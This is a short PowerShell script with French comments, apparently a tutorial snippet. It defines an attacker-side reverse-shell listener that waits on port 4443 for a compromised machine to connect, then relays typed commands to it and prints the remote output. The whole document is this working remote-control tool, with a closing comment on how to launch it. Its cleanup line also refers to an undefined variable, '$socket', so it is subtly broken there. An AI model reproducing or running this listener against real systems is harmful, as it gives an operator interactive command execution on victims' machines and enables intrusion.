Function Receive-PSReverseShell{ 
# Ouvrir une "socket" et se mettre en écoute. 
$sock = new-object System.Net.Sockets.TcpListener('10.0.2.5', 4443) 
$sock.start() 
 
# Attendre une connexion réseau 
$client = $sock.AcceptTcpClient() 
 
# Client connecté 
$stream = $client.GetStream(); 
Write-host 'Client connected !!!' 
 
# Gestion des buffers en mémoire nécessaires à la connexion 
$writer = new-object System.IO.StreamWriter($stream); 
$buff = new-object System.Byte[] 4096; 
$enc = new-object System.Text.AsciiEncoding; 
 
do{ 
   # Attendre la saisie d'une commande par l'utilisateur local 
   $command = read-host 
 
   # L'envoyer vers l'autre machine via la socket 
   $writer.WriteLine($command) 
   $writer.Flush(); 
   if($command -eq "quit"){ 
       break 
   } 
    
   # Attendre que des données arrivent de la machine distante 
        $read = $null; 
        while($stream.DataAvailable -or $read -eq $null) { 
                $read = $stream.Read($buff, 0, 4096) 
          $out = $enc.GetString($buff, 0, $read) 
          # Les afficher dans la console locale 
          Write-host $out 
        } 
# Recommencer ces étapes tant que la connexion reste établie. 
} While ($client.Connected -eq $true) 
 
$socket.Stop() 
$client.close() 
$stream.Dispose() 
} 

#Vous pouvez lancer ce script en appelant la fonction :

#> Receive-PSReverseShell